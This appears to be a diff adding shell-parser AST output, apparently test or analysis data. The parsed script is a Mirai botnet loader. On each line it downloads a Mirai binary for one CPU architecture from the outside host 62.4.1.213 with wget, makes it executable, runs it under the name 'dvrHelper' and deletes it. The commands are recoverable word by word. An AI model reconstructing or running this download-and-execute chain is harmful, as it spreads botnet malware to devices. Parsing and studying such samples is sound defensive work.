@@ -1,0 +1,256 @@
+ListNode(lineno=3, pos=(13, 111), parts=[
+  CommandNode(lineno=3, pos=(13, 58), parts=[
+    WordNode(lineno=3, pos=(13, 17), word='wget'),
+    WordNode(lineno=3, pos=(18, 45), word='http://62.4.1.213/mirai.arm'),
+    WordNode(lineno=3, pos=(46, 48), word='-O'),
+    WordNode(lineno=3, pos=(49, 58), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(58, 59)),
+  CommandNode(lineno=3, pos=(60, 78), parts=[
+    WordNode(lineno=3, pos=(60, 65), word='chmod'),
+    WordNode(lineno=3, pos=(66, 68), word='+x'),
+    WordNode(lineno=3, pos=(69, 78), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(78, 79)),
+  CommandNode(lineno=3, pos=(80, 91), parts=[
+    WordNode(lineno=3, pos=(80, 91), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(91, 92)),
+  CommandNode(lineno=3, pos=(93, 109), parts=[
+    WordNode(lineno=3, pos=(93, 95), word='rm'),
+    WordNode(lineno=3, pos=(96, 99), word='-fr'),
+    WordNode(lineno=3, pos=(100, 109), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=3, op='&', pos=(110, 111)),
+])
+ListNode(lineno=4, pos=(112, 211), parts=[
+  CommandNode(lineno=4, pos=(112, 158), parts=[
+    WordNode(lineno=4, pos=(112, 116), word='wget'),
+    WordNode(lineno=4, pos=(117, 145), word='http://62.4.1.213/mirai.arm7'),
+    WordNode(lineno=4, pos=(146, 148), word='-O'),
+    WordNode(lineno=4, pos=(149, 158), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(158, 159)),
+  CommandNode(lineno=4, pos=(160, 178), parts=[
+    WordNode(lineno=4, pos=(160, 165), word='chmod'),
+    WordNode(lineno=4, pos=(166, 168), word='+x'),
+    WordNode(lineno=4, pos=(169, 178), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(178, 179)),
+  CommandNode(lineno=4, pos=(180, 191), parts=[
+    WordNode(lineno=4, pos=(180, 191), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(191, 192)),
+  CommandNode(lineno=4, pos=(193, 209), parts=[
+    WordNode(lineno=4, pos=(193, 195), word='rm'),
+    WordNode(lineno=4, pos=(196, 199), word='-fr'),
+    WordNode(lineno=4, pos=(200, 209), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=4, op='&', pos=(210, 211)),
+])
+ListNode(lineno=5, pos=(212, 311), parts=[
+  CommandNode(lineno=5, pos=(212, 258), parts=[
+    WordNode(lineno=5, pos=(212, 216), word='wget'),
+    WordNode(lineno=5, pos=(217, 245), word='http://62.4.1.213/mirai.mips'),
+    WordNode(lineno=5, pos=(246, 248), word='-O'),
+    WordNode(lineno=5, pos=(249, 258), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(258, 259)),
+  CommandNode(lineno=5, pos=(260, 278), parts=[
+    WordNode(lineno=5, pos=(260, 265), word='chmod'),
+    WordNode(lineno=5, pos=(266, 268), word='+x'),
+    WordNode(lineno=5, pos=(269, 278), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(278, 279)),
+  CommandNode(lineno=5, pos=(280, 291), parts=[
+    WordNode(lineno=5, pos=(280, 291), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(291, 292)),
+  CommandNode(lineno=5, pos=(293, 309), parts=[
+    WordNode(lineno=5, pos=(293, 295), word='rm'),
+    WordNode(lineno=5, pos=(296, 299), word='-fr'),
+    WordNode(lineno=5, pos=(300, 309), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=5, op='&', pos=(310, 311)),
+])
+ListNode(lineno=6, pos=(312, 410), parts=[
+  CommandNode(lineno=6, pos=(312, 357), parts=[
+    WordNode(lineno=6, pos=(312, 316), word='wget'),
+    WordNode(lineno=6, pos=(317, 344), word='http://62.4.1.213/mirai.ppc'),
+    WordNode(lineno=6, pos=(345, 347), word='-O'),
+    WordNode(lineno=6, pos=(348, 357), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(357, 358)),
+  CommandNode(lineno=6, pos=(359, 377), parts=[
+    WordNode(lineno=6, pos=(359, 364), word='chmod'),
+    WordNode(lineno=6, pos=(365, 367), word='+x'),
+    WordNode(lineno=6, pos=(368, 377), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(377, 378)),
+  CommandNode(lineno=6, pos=(379, 390), parts=[
+    WordNode(lineno=6, pos=(379, 390), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(390, 391)),
+  CommandNode(lineno=6, pos=(392, 408), parts=[
+    WordNode(lineno=6, pos=(392, 394), word='rm'),
+    WordNode(lineno=6, pos=(395, 398), word='-fr'),
+    WordNode(lineno=6, pos=(399, 408), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=6, op='&', pos=(409, 410)),
+])
+ListNode(lineno=7, pos=(411, 509), parts=[
+  CommandNode(lineno=7, pos=(411, 456), parts=[
+    WordNode(lineno=7, pos=(411, 415), word='wget'),
+    WordNode(lineno=7, pos=(416, 443), word='http://62.4.1.213/mirai.spc'),
+    WordNode(lineno=7, pos=(444, 446), word='-O'),
+    WordNode(lineno=7, pos=(447, 456), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(456, 457)),
+  CommandNode(lineno=7, pos=(458, 476), parts=[
+    WordNode(lineno=7, pos=(458, 463), word='chmod'),
+    WordNode(lineno=7, pos=(464, 466), word='+x'),
+    WordNode(lineno=7, pos=(467, 476), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(476, 477)),
+  CommandNode(lineno=7, pos=(478, 489), parts=[
+    WordNode(lineno=7, pos=(478, 489), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(489, 490)),
+  CommandNode(lineno=7, pos=(491, 507), parts=[
+    WordNode(lineno=7, pos=(491, 493), word='rm'),
+    WordNode(lineno=7, pos=(494, 497), word='-fr'),
+    WordNode(lineno=7, pos=(498, 507), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=7, op='&', pos=(508, 509)),
+])
+ListNode(lineno=8, pos=(510, 610), parts=[
+  CommandNode(lineno=8, pos=(510, 557), parts=[
+    WordNode(lineno=8, pos=(510, 514), word='wget'),
+    WordNode(lineno=8, pos=(515, 544), word='http://62.4.1.213/mirai.arm5n'),
+    WordNode(lineno=8, pos=(545, 547), word='-O'),
+    WordNode(lineno=8, pos=(548, 557), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(557, 558)),
+  CommandNode(lineno=8, pos=(559, 577), parts=[
+    WordNode(lineno=8, pos=(559, 564), word='chmod'),
+    WordNode(lineno=8, pos=(565, 567), word='+x'),
+    WordNode(lineno=8, pos=(568, 577), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(577, 578)),
+  CommandNode(lineno=8, pos=(579, 590), parts=[
+    WordNode(lineno=8, pos=(579, 590), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(590, 591)),
+  CommandNode(lineno=8, pos=(592, 608), parts=[
+    WordNode(lineno=8, pos=(592, 594), word='rm'),
+    WordNode(lineno=8, pos=(595, 598), word='-fr'),
+    WordNode(lineno=8, pos=(599, 608), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=8, op='&', pos=(609, 610)),
+])
+ListNode(lineno=9, pos=(611, 710), parts=[
+  CommandNode(lineno=9, pos=(611, 657), parts=[
+    WordNode(lineno=9, pos=(611, 615), word='wget'),
+    WordNode(lineno=9, pos=(616, 644), word='http://62.4.1.213/mirai.m68k'),
+    WordNode(lineno=9, pos=(645, 647), word='-O'),
+    WordNode(lineno=9, pos=(648, 657), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(657, 658)),
+  CommandNode(lineno=9, pos=(659, 677), parts=[
+    WordNode(lineno=9, pos=(659, 664), word='chmod'),
+    WordNode(lineno=9, pos=(665, 667), word='+x'),
+    WordNode(lineno=9, pos=(668, 677), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(677, 678)),
+  CommandNode(lineno=9, pos=(679, 690), parts=[
+    WordNode(lineno=9, pos=(679, 690), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(690, 691)),
+  CommandNode(lineno=9, pos=(692, 708), parts=[
+    WordNode(lineno=9, pos=(692, 694), word='rm'),
+    WordNode(lineno=9, pos=(695, 698), word='-fr'),
+    WordNode(lineno=9, pos=(699, 708), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=9, op='&', pos=(709, 710)),
+])
+ListNode(lineno=10, pos=(711, 810), parts=[
+  CommandNode(lineno=10, pos=(711, 757), parts=[
+    WordNode(lineno=10, pos=(711, 715), word='wget'),
+    WordNode(lineno=10, pos=(716, 744), word='http://62.4.1.213/mirai.mpsl'),
+    WordNode(lineno=10, pos=(745, 747), word='-O'),
+    WordNode(lineno=10, pos=(748, 757), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(757, 758)),
+  CommandNode(lineno=10, pos=(759, 777), parts=[
+    WordNode(lineno=10, pos=(759, 764), word='chmod'),
+    WordNode(lineno=10, pos=(765, 767), word='+x'),
+    WordNode(lineno=10, pos=(768, 777), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(777, 778)),
+  CommandNode(lineno=10, pos=(779, 790), parts=[
+    WordNode(lineno=10, pos=(779, 790), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(790, 791)),
+  CommandNode(lineno=10, pos=(792, 808), parts=[
+    WordNode(lineno=10, pos=(792, 794), word='rm'),
+    WordNode(lineno=10, pos=(795, 798), word='-fr'),
+    WordNode(lineno=10, pos=(799, 808), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=10, op='&', pos=(809, 810)),
+])
+ListNode(lineno=11, pos=(811, 909), parts=[
+  CommandNode(lineno=11, pos=(811, 856), parts=[
+    WordNode(lineno=11, pos=(811, 815), word='wget'),
+    WordNode(lineno=11, pos=(816, 843), word='http://62.4.1.213/mirai.sh4'),
+    WordNode(lineno=11, pos=(844, 846), word='-O'),
+    WordNode(lineno=11, pos=(847, 856), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(856, 857)),
+  CommandNode(lineno=11, pos=(858, 876), parts=[
+    WordNode(lineno=11, pos=(858, 863), word='chmod'),
+    WordNode(lineno=11, pos=(864, 866), word='+x'),
+    WordNode(lineno=11, pos=(867, 876), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(876, 877)),
+  CommandNode(lineno=11, pos=(878, 889), parts=[
+    WordNode(lineno=11, pos=(878, 889), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(889, 890)),
+  CommandNode(lineno=11, pos=(891, 907), parts=[
+    WordNode(lineno=11, pos=(891, 893), word='rm'),
+    WordNode(lineno=11, pos=(894, 897), word='-fr'),
+    WordNode(lineno=11, pos=(898, 907), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=11, op='&', pos=(908, 909)),
+])
+ListNode(lineno=12, pos=(910, 1008), parts=[
+  CommandNode(lineno=12, pos=(910, 955), parts=[
+    WordNode(lineno=12, pos=(910, 914), word='wget'),
+    WordNode(lineno=12, pos=(915, 942), word='http://62.4.1.213/mirai.x86'),
+    WordNode(lineno=12, pos=(943, 945), word='-O'),
+    WordNode(lineno=12, pos=(946, 955), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(955, 956)),
+  CommandNode(lineno=12, pos=(957, 975), parts=[
+    WordNode(lineno=12, pos=(957, 962), word='chmod'),
+    WordNode(lineno=12, pos=(963, 965), word='+x'),
+    WordNode(lineno=12, pos=(966, 975), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(975, 976)),
+  CommandNode(lineno=12, pos=(977, 988), parts=[
+    WordNode(lineno=12, pos=(977, 988), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(988, 989)),
+  CommandNode(lineno=12, pos=(990, 1006), parts=[
+    WordNode(lineno=12, pos=(990, 992), word='rm'),
+    WordNode(lineno=12, pos=(993, 996), word='-fr'),
+    WordNode(lineno=12, pos=(997, 1006), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=12, op='&', pos=(1007, 1008)),
+])
+ListNode(lineno=13, pos=(1009, 1014), parts=[
+  CommandNode(lineno=13, pos=(1009, 1013), parts=[
+    WordNode(lineno=13, pos=(1009, 1013), word='exit'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(1013, 1014)),
+])
